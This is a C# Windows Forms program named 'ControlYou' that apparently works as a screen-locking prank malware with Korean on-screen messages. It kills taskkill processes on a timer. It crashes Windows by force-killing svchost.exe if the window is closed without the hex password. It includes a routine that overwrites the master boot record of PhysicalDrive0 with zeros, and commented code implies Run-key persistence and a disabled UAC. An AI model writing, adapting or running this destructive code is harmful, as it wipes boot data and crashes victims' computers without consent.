using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ControlYou
{
    public partial class Form1 : Form
    {

        bool canClose = false;


        // https://github.com/Zaczero/SimpleMbrOverride/blob/master/SimpleMbrOverride/Program.cs

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        //dwDesiredAccess
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        //dwShareMode
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        int randomNumber;
        string answerHex;

        public Form1()
        {
            randomNumber = new Random().Next(10,99);
            answerHex = randomNumber.ToString("X");
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            killTaskkill.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("암호는 " + randomNumber + "을 Hex 값으로 변환한값이다.(0x 제외)");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox2.Text == answerHex)
            {
                canClose = true;
                MessageBox.Show("정답이다!");
                /*
                RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                rk.DeleteValue("SystemHelper");

                RegistryKey rk2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                rk2.SetValue("EnableLUA", 1);*/
                Application.Exit();
            }
            else {
                new Form2().Show();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if(!canClose) blueScreen();
        }

        public static void blueScreen() {
            Process bsod = new Process();
            bsod.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
            bsod.StartInfo.Arguments = "/C taskkill /f /im svchost.exe";
            bsod.Start();
        }

        public static void overwriteMbr() {
            var mbrData = new byte[MbrSize];

            var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0",
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting,
                0,
                IntPtr.Zero);

            if (mbr == (IntPtr)(-0x1))
            {
                MessageBox.Show("Run as administrator");
                return;
            }

            if (WriteFile(
                mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero))
            {
                // SUCC
                Form1.blueScreen();
                return;
            }
            else
            {
                // FAIL
                MessageBox.Show("fail");
                return;
            }
        }

        private void killTaskkill_Tick(object sender, EventArgs e)
        {
            Process[] prcList = Process.GetProcessesByName("taskkill");
            foreach (Process prc in prcList) {
                prc.Kill();
            }
        }
    }
}
